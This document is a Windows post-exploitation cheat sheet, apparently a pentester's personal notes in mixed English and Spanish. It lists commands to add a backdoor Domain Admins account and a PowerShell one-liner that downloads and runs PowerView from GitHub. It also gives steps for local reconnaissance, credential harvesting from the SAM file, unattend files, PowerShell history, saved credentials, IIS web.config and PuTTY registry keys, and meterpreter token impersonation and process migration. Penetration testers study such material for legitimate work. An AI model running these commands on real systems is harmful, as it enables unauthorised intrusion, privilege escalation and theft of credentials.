
## Documentation
https://github.com/emilyanncr/Windows-Post-Exploitation

## Basic CMD comamd for recon
https://www.hackingarticles.in/manual-post-exploitation-windows-pc-system-command/

## Tools and tactics
https://opensourcelibs.com/lib/windows-post-exploitation
https://github.com/samratashok/nishang

## ADD user to domain controller
	# WINDOWS: Add domain user and put them in Domain Admins group
	- net user username password /ADD /DOMAIN
	- net group "Domain Admins" username /ADD /DOMAIN

	# WINDOWS: Add local user and put them local Administrators group
	- net user username password /ADD
	- net localgroup Administrators username /ADD

# PowerSploit
	# Github
	https://github.com/PowerShellMafia/PowerSploit

	## PowerView Recon
	https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
	- Load:
		 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

## Priv Escalation 
	#### USER Enumeration
	* Current userâ€™s privileges: whoami /priv
	* List users: net users
	* List details of a user: net user username (e.g. net user Administrator)
	* Other users logged in simultaneously: qwinsta (the query session command can be used the same way) 
	* User groups defined on the system: net localgroup
	* List members of a specific group: net localgroup groupname (e.g. net localgroup Administrators)
	* systeminfo
		- systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

	### Search files
	* findstr [path] [string in file] [filter]
		> Esample: findstr /si password *.txt

	### Patch level
	* list updates installed on the target system.
		> wmic qfe get Caption,Description,HotFixID,InstalledOn

	### Network conenctions
	* netstat -ano   -- List all listening ports

	### Scheduled tasks
	* schtasks
	* schtasks /query /fo LIST /v
	* schtasks /query /tn [taskName] /fo list /v
	* Review Params
		> "Task to Run"
		> "Run As User"
	* Review Permisions of the executable binari
		> icacls c:\tasks\schtask.bat

	## Antivirus
	* sc query windefend   -- Specific for windows defender
	* Get-MpComputerStatu  -- Powershell

	## Windows Services
	* Reveiw service
		> sc qc [service]
	* Service Configuration in Registry
		> HKLM\SYSTEM\CurrentControlSet\Services\

	## Unquoted Service Paths
	* Example of vulnerable service
		> C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

## Get SAM creds
	## Location
	C:\Windows\System32\config\SAM

## Gather Credentials
	### Windows Deployment Services
	C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

    ### Powershell History
    > From CMD Shell run: 
    	- type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

    ### Saved Windows Credentials
    > List Saved Credentials
    	- cmdkey /list
    > Emplear credenciales
    	- runas /savecred /user:admin cmd.exe

    ### IIS Configuration
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    > Search potencial database conexions
    	- type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

    ### PuTTY
    > Get proxy credentials
    	- reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

## Token Impersonation

	# Access token consists of - https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens
		- User SIDs(security identifier)
		- Group SIDs
		- Privileges

	# There are two types of access tokens:
		- Primary access tokens: those associated with a user account that are generated on log on
		- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

	# Impersonation token, there are different levels:
		- SecurityAnonymous: current user/client cannot impersonate another user/client
		- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
		- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
		- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

	# Most commonly abused privileges:
		SeImpersonatePrivilege
		SeAssignPrimaryPrivilege
		SeTcbPrivilege
		SeBackupPrivilege
		SeRestorePrivilege
		SeCreateTokenPrivilege
		SeLoadDriverPrivilege
		SeTakeOwnershipPrivilege
		SeDebugPrivilege

	# Get the privileges of the acount
		- whoami /priv

	# Exploit the vulneravility whith meterpreter
		- load incognito

	# listar tokens
		- list_tokens -g

	# impersonar token y verificar
		- impersonate_token "BUILTIN\Administrators"
		- getuid

	# migrar a un proceso con privilegios elevados
		- El proceso mas recomendable es "services.exe"
		- comando "ps" para ver los procesos
		- migrate "PID-Process"
